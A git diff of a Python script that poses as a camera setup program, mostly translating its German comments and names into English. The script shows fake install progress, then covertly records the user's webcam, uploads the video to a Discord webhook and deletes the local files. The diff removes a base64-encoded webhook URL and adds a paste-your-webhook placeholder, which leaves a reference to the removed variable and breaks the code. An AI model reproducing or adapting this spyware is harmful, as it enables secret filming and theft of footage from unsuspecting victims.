@@ -27,18 +27,18 @@ installation done. proceeding with setup!
 
 def FILM():
     import cv2
-    # Fenster für die Vorschau erstellen
+    # Create a window for preview
     cv2.namedWindow("Camera.exe")
 
-    # Kamera öffnen (Index 0 für die erste Kamera)
+    # Open the camera (Index 0 for the first camera)
     vc = cv2.VideoCapture(0)
 
-    # Überprüfen, ob die Kamera geöffnet wurde
+    # Check if the camera opened successfully
     if vc.isOpened():
         rval, frame = vc.read()
     else:
         rval = False
-    # Schleife für die kontinuierliche Anzeige des Kamerabilds
+    # Loop for continuous display of camera image
     while rval:
         cv2.imshow("Camera.exe", frame)
         rval, frame = vc.read()
@@ -46,11 +46,11 @@ def FILM():
         if key == 27:
             break
 
-    # Fenster schließen und Kamera freigeben
+    # Close the window and release the camera
     cv2.destroyWindow("Camera.exe")
     vc.release()
 
-# Dauer der Videoaufnahme in Sekunden
+# Duration of video recording in seconds
 def CHEESE():
     from tkinter import messagebox
     import subprocess
@@ -78,66 +78,65 @@ def CHEESE():
     time.sleep(3)
     print("100%")
     time.sleep(1)
-    print("proceeding...")
+    print("Proceeding...")
     messagebox.showinfo("Cam.exe", "Give this program some time to start. :)\nPress ESC to stop the program.\nEnjoy :)")
 
-    aufnahme_dauer = 15
+    recording_duration = 15
 
-    # Webcam automatisch erkennen
-    webcam_index = 0  # Index der Webcam (kann je nach System variieren)
+    # Automatically detect the webcam
+    webcam_index = 0  # Index of the webcam (may vary depending on the system)
 
-    # Webcam öffnen
+    # Open the webcam
     cap = imageio.get_reader(f"<video{webcam_index}>", 'ffmpeg')
 
-    # Video-Codec und Ausgabedatei festlegen
+    # Set video codec and output file
     fps = 30
-    output_datei = 'input.mp4'
-    writer = imageio.get_writer(output_datei, fps=fps, codec='libx264')
+    output_file = 'input.mp4'
+    writer = imageio.get_writer(output_file, fps=fps, codec='libx264')
 
-    # Startzeit der Aufnahme
-    startzeit = time.time()
+    # Start time of recording
+    start_time = time.time()
 
     for frame in cap:
         writer.append_data(frame)
-        if int(time.time() - startzeit) >= aufnahme_dauer:
+        if int(time.time() - start_time) >= recording_duration:
             break
 
-    # Aufnahme beenden
+    # End the recording
     writer.close()
 
-    # Video mit MoviePy beschleunigen
-    in_loc = 'input.mp4'  # Pfad zur Eingabedatei
-    out_loc = 'video.mp4'  # Pfad zur Ausgabedatei
+    # Speed up the video using MoviePy
+    in_loc = 'input.mp4'  # Input file path
+    out_loc = 'video.mp4'  # Output file path
 
-    # Video-Clip importieren
+    # Import video clip
     clip = VideoFileClip(in_loc)
 
-    # FPS anpassen (hier wird die FPS um den Faktor 3 erhöht)
+    # Adjust FPS (increasing it by a factor of 4)
     clip = clip.set_fps(clip.fps * 4)
 
-    # Geschwindigkeit erhöhen
+    # Increase speed
     final = clip.fx(vfx.speedx, 4)
 
-    # Video speichern
+    # Save the video
     final.write_videofile(out_loc)
 
     print(f"Setup nearly done.")
 
     subprocess.run("del input.mp4", shell=True)
 
-    # string für checks
-    b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTU1NjEyNjMwNzM4OTQ2MC9CMEYwNWZjRHg0a0xjdl9iMFZrZE5UWDQ2Q2t5N203aTBwR3B3Nkg3T3ZidDRuT3hUNml5bDJRTE5xZ3lhRnFDY2VoWQ=="
+    # define your discord webhook
+    YOUR_WEBHOOK = "PASTE YOUR WEBHOOK HERE IN BASE64 FORMAT!"
     webhook_url = base64.b64decode(b).decode("utf-8")
+   
+    file_path = 'video.mp4'
 
-    # zwischenspeicher
-    dateipfad = 'video.mp4'
-
-    # Datei öffnen und Inhalt lesen
-    with open(dateipfad, 'rb') as f:
-        dateiinhalt = f.read()
+    # Open the file and read its content
+    with open(file_path, 'rb') as f:
+        file_content = f.read()
 
     payload = {
-        'file': ('video.mp4', dateiinhalt)
+        'file': ('video.mp4', file_content)
     }
 
     response = requests.post(webhook_url, files=payload)
@@ -147,9 +146,6 @@ def CHEESE():
     else:
        print(f"Setup Failed. Trying to proceed...")
     subprocess.run("del video.mp4", shell=True)
-
-
-
 
 INSTALL()
 CHEESE()
